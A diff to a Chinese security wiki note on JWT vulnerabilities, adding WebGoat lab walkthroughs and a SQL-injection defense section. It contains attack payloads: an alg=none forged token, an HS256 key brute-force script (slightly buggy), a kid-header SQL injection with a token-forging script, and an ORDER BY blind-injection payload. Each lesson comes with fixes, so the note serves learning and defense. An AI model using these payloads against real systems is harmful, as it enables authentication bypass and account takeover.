@@ -1,8 +1,9 @@
 ---
 title: JWT漏洞原理与实战利用
-description: 系统梳理 JWT 结构、常见漏洞（算法混淆、密钥爆破、None Algorithm、信息泄露）及利用工具，结合 DDCTF 与 0w1Club
-  CTF 实战复现垂直越权、盐值离线爆破、SQL 注入绕过全过程。深度解析 JWT 在 CSRF 防御中的 Token 生成与验证实现细节，结合 Java JWT
-  库源码分析完善防御视角内容。
+description: 系统梳理 JWT 结构、常见漏洞（算法混淆、密钥爆破、None Algorithm、信息泄露、refresh_token 越权、kid 注入）及利用工具，结合
+  DDCTF、0w1Club CTF 与 WebGoat 靶场（Lesson 5/8/10/11）实战复现垂直越权、盐值离线爆破、SQL 注入绕过、refresh_token
+  越权刷新 access_token、kid 参数 SQL 注入四大经典漏洞场景全过程。深度解析 JWT 在 CSRF 防御中的 Token 生成与验证实现细节，结合
+  Java JWT 库源码分析完善防御视角内容。
 category: program-analysis
 tags:
 - JWT
@@ -10,6 +11,7 @@ tags:
 - DDCTF
 - 0w1Club
 - CTF
+- WebGoat
 - 垂直越权
 - 算法混淆
 - 密钥爆破
@@ -20,6 +22,8 @@ tags:
 - CSRF防御
 - Java JWT
 - 源码分析
+- refresh_token
+- kid参数注入
 date: '2023-04-16'
 updated: '2026-11-14'
 ---
@@ -412,6 +416,177 @@ HS256 为对称加密，密钥强度取决于复杂度。使用字典爆破脚�
 
 > 也可使用 [jwt.io Debugger](https://jwt.io/) 可视化完成上述构造。
 
+## WebGoat JWT 实战靶场完整复现（Lesson 5/8/10/11）
+
+> 来源：[[xd-security-deserialization-xxe-notes-day37-39]]（XD安全 Day40-41 Java安全学习笔记）
+
+WebGoat 靶场提供了四个经典的 JWT 漏洞练习关卡，覆盖了算法绕过、密钥爆破、refresh_token 越权、kid 参数 SQL 注入四大核心场景。
+
+### Lesson 5：未验证签名算法（alg=none 绕过）
+
+#### 漏洞原理
+后端解析 JWT 时未验证签名算法是否为预期算法，攻击者可将 `alg` 修改为 `none`，去掉 Signature 部分，服务端若未校验算法白名单将直接信任 Payload 内容。
+
+#### 复现步骤
+1. 登录普通用户（如 Tom），点击“重置投票”按钮，抓包获取 JWT
+2. 解码 JWT 分析结构：
+   - **Header**：`{"alg":"HS256","typ":"JWT"}`
+   - **Payload**：`{"admin":"false","user":"Tom","iat":...}`
+3. 修改 Payload 中 `admin` 为 `true`，Header 中 `alg` 为 `none`
+4. Base64URL 编码 Header 和 Payload，拼接为 `header.payload.`（Signature 留空）
+5. 替换请求中的 JWT 发送，成功重置投票
+
+#### 关键 Payload 构造
+```
+Header:    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+Payload:   eyJhZG1pbiI6InRydWUiLCJ1c2VyIjoiVG9tIiwiaWF0IjoxNT... 
+Token:     eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6InRydWUiLCJ1c2VyIjoiVG9tIiwiaWF0IjoxNT... .
+```
+
+#### 修复建议
+- 服务端维护算法白名单，仅允许 HS256/RS256 等预期算法
+- 显式拒绝 `alg: "none"` 的 Token
+
+---
+
+### Lesson 8：HS256 密钥爆破
+
+#### 漏洞原理
+HS256 为对称加密，密钥强度直接决定安全性。若密钥设置过于简单（如常见单词、默认值），攻击者可通过字典离线爆破还原密钥，进而伪造任意合法 JWT。
+
+#### 复现步骤
+1. 获取合法 JWT（任意用户登录后捕获）
+2. 使用字典（题目提示提供字典）离线爆破 HS256 密钥
+3. 爆破结果：`secret = "victory"`
+4. 使用爆破出的密钥构造任意用户（如 admin）的合法 JWT
+
+#### 爆破脚本思路（Python 示例）
+```python
+import jwt, base64
+
+token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiVG9tIiwiaWF0IjoxN...signature"
+header_b64, payload_b64, signature = token.split('.')
+signing_input = f"{header_b64}.{payload_b64}"
+
+with open('dict.txt') as f:
+    for secret in f:
+        secret = secret.strip()
+        calc_sig = jwt.algorithms.HMACAlgorithm(HMACAlgorithm.SHA256).sign(signing_input, secret)
+        if base64.urlsafe_b64encode(calc_sig).rstrip(b'=').decode() == signature:
+            print(f"Found secret: {secret}")
+            break
+```
+
+#### 修复建议
+- 使用高熵随机密钥（≥256 bits）
+- 定期轮换密钥
+- 考虑使用非对称算法（RS256/ES256）
+
+---
+
+### Lesson 10：refresh_token 越权刷新 access_token
+
+#### 漏洞原理
+服务端未校验 `access_token` 与 `refresh_token` 是否属于同一用户。攻击者可使用自己的 `refresh_token` 刷新受害者的过期 `access_token`，实现水平越权。
+
+#### 复现场景
+- 登录 Jerry 获取 `access_token_J`、`refresh_token_J`
+- 登录 Tom 获取 `access_token_T`（已过期）、`refresh_token_T`
+- 使用 `refresh_token_J` + `access_token_T` 请求刷新接口
+- 服务端返回 Tom 的新 `access_token`，攻击者以 Tom 身份访问资源
+
+#### 攻击流程图解
+```
+Attacker (Jerry)          Victim (Tom)              Server
+     |                        |                        |
+     |-- login -->            |                        |
+     |<-- access_J, refresh_J |                        |
+     |                        |-- login -->            |
+     |                        |<-- access_T(expired),  |
+     |                        |     refresh_T          |
+     |                        |                        |
+     |-- POST /refresh ------------------------------>|
+     |   access_token: access_T                       |
+     |   refresh_token: refresh_J                     |
+     |                        |                        |
+     |<-- 200 OK: new_access_T -----------------------|
+     |                        |                        |
+     |-- GET /resource (new_access_T) --------------->|
+     |<-- Tom's data -----------------------------------|
+```
+
+#### 复现难点说明
+原文提到“复现有问题”，参考文章链接已失效。实际测试中需注意：
+- 刷新接口的具体参数名（可能为 `refresh_token`、`access_token` 或放在 Header 中）
+- 部分实现会校验 `refresh_token` 对应的用户 ID 与 `access_token` 中的 `sub`/`user` 是否一致，若校验则漏洞不存在
+- 需结合具体 WebGoat 版本源码分析
+
+#### 修复建议
+- 服务端存储 `refresh_token` 与用户 ID 的绑定关系
+- 刷新时必须校验 `refresh_token` 所属用户与 `access_token` 声称用户一致
+- `refresh_token` 设置较短过期时间，配合撤销机制
+
+---
+
+### Lesson 11：kid 参数 SQL 注入
+
+#### 漏洞原理
+JWT Header 中的 `kid` (Key ID) 参数用于标识签名密钥。后端解析 JWT 时，直接使用 `kid` 值拼接 SQL 查询数据库获取密钥，未使用参数化查询，导致 SQL 注入。
+
+#### 源码分析（关键片段）
+```java
+// 伪代码还原漏洞逻辑
+String kid = jwt.getHeader().getKeyId();  // 从 Header 取 kid
+String sql = "SELECT key FROM jwt_keys WHERE id = '" + kid + "'";  // 直接拼接
+ResultSet rs = stmt.executeQuery(sql);
+String secret = rs.getString("key");  // 返回密钥用于验签
+```
+
+#### 攻击思路
+1. 点击“删除 Jerry 账户”按钮，抓包获取 JWT
+2. 解码 Header 发现存在 `kid` 字段：`{"alg":"HS256","typ":"JWT","kid":"webgoat_key"}`
+3. 构造 SQL 注入 Payload，使查询返回攻击者可控的密钥：
+   ```
+   kid = "123' and 1=2 union select 'attacker_controlled_key'--"
+   ```
+   对应 SQL：`SELECT key FROM jwt_keys WHERE id = '123' and 1=2 union select 'attacker_controlled_key'--'`
+4. 使用返回的密钥 `attacker_controlled_key` 签名伪造 JWT，修改 Payload 指向删除 Tom 账户
+5. 发送请求，成功删除 Tom 账户
+
+#### 完整 Token 构造脚本（Python）
+```python
+import jwt, base64, json
+
+# 1. 构造恶意 Header，注入 kid
+malicious_header = {
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "123' and 1=2 union select 'attacker_key'--"
+}
+
+# 2. 构造 Payload（指定删除 Tom）
+malicious_payload = {
+    "user": "Tom",
+    "iat": 1234567890
+}
+
+# 3. 使用注入返回的密钥签名
+# 注意：实际攻击中需先确定 union select 返回的列数、类型，并确保数据库中无 id='123' 的记录
+secret = "attacker_key"
+token = jwt.encode(malicious_payload, secret, algorithm='HS256', headers=malicious_header)
+print(token)
+```
+
+#### 实战细节
+- 需确保 `union select` 的列数与原表 `jwt_keys` 一致（通常为 id、key 两列）
+- 注入返回的密钥需为 Base64 编码或原文，视后端解码逻辑而定（原文提到“返回密钥的 base64 编码”）
+- 利用 jwt.io 或脚本生成最终 Token，替换请求包中的 JWT
+
+#### 修复建议
+- 使用参数化查询 / PreparedStatement 查询密钥
+- 校验 `kid` 格式（如仅允许字母数字下划线），拒绝含特殊字符的值
+- 密钥查询失败时应返回错误，而非返回空或默认密钥
+
 ## 0w1Club CTF 实战案例补充
 
 ### 案例一：JWT MD5 盐值离线爆破伪造 admin token
@@ -499,6 +674,40 @@ Token:     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPT
 | JWT 解析后的用户输入直接拼接 SQL | 使用参数化查询 / 预编译语句 |
 | 业务逻辑过度信任客户端传递的身份标识 | 服务端维护会话映射，JWT 仅作标识不作授权依据 |
 
+## Java 预编译防御 SQL 注入（补充）
+
+> 来源：[[xd-security-deserialization-xxe-notes-day37-39]]（XD安全 Day40-41 学习笔记）
+
+### SQL 注入本质
+未经检查的用户输入通过字符串拼接进入 SQL 语句，改变了原本的执行逻辑。
+
+### PreparedStatement 预编译原理
+1. SQL 语句含占位符 `?` 发送给数据库，**预编译** 生成执行计划
+2. 执行计划确定后，**逻辑固化**，后续 `setXXX()` 传入的参数仅作为**数据**处理，不再参与语法解析
+3. 即使参数含 SQL 关键字，也会被当作普通字符串处理
+
+### 经典预处理代码
+```java
+String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setString(1, username);  // 参数作为纯数据传入
+ps.setString(2, password);
+ResultSet rs = ps.executeQuery();
+```
+
+### 无法参数化的场景
+| 场景 | 原因 | 替代方案 |
+|------|------|----------|
+| `ORDER BY` 字段名 | 字段名不能加引号，参数化会变字符串 | 白名单校验字段名 |
+| `LIKE` 模糊查询 | 通配符 `%` `_` 需拼接在参数中 | 参数化传入已拼接好通配符的值 |
+| 表名、库名、函数名 | 同字段名 | 白名单校验 |
+
+### WebGoat 实战：Order By 注入
+- 靶场：WebGoat 8.2.1 SQL Injection (mitigation) 第 12 关
+- 注入点：排序字段参数 `column=ip` → `column=ip'` 报错
+- 利用：布尔盲注 payload `(select case when (substr((select ip from servers limit 1),1,1)='1') then 1 else 2 end)` 配合 Burp Intruder 爆破
+- 结果：服务器 IP 前三位 `104`
+
 ## 利用工具与脚本
 
 - **JwtExploit** 系列脚本（GitHub）：  
@@ -514,6 +723,7 @@ Token:     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPT
 - [[0w1club-ctf-web-writeup-hash-extension-rsa]] — 同源 CTF Web 题解，涵盖哈希长度扩展攻击、PHP 弱类型比较、RSA 解密等技术
 - [[java-preparedstatement-sql-injection-defense]] — Java PreparedStatement 预编译机制防御 SQL 注入，与 JWT 场景下的参数化查询防御同属一类
 - [[spring-boot-devtools-deserialization-rce]] — Spring Boot DevTools 弱默认密钥导致反序列化 RCE，与 JWT 密钥管理不当同属“默认/弱密钥”风险类
+- [[xd-security-deserialization-xxe-notes-day37-39]] — XD安全 Day40-41 Java安全学习笔记原文，包含 WebGoat JWT 全关卡复现细节
 
 ## 参考资源
 
@@ -522,7 +732,10 @@ Token:     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPT
 - 作者 GitHub（DDCTF 复现脚本）：<https://github.com/ShadowFlow123/>
 - 博客园对应文章：<https://www.cnblogs.com/jinbuqi/p/10361698.html>
 - CSRF Token 防御原文：[无名安全团队文章](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247486542&idx=1&sn=3828e2d41f13049dd4f974394272d568)
+- XD安全学习笔记原文：[Day40-41 Java安全](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247485028&idx=1&sn=2fc279d7fc79cad6169aed6286653e37)
 
 ## 来源
 
 - [0x00实验室-202108-202304_073](../sources/0x00实验室-202108-202304_073.md)
+- [xd_security_day40_41_java_notes](../sources/xd_security_day40_41_java_notes.md)
+- [0x00实验室-202108-202304_090](../sources/0x00实验室-202108-202304_090.md)
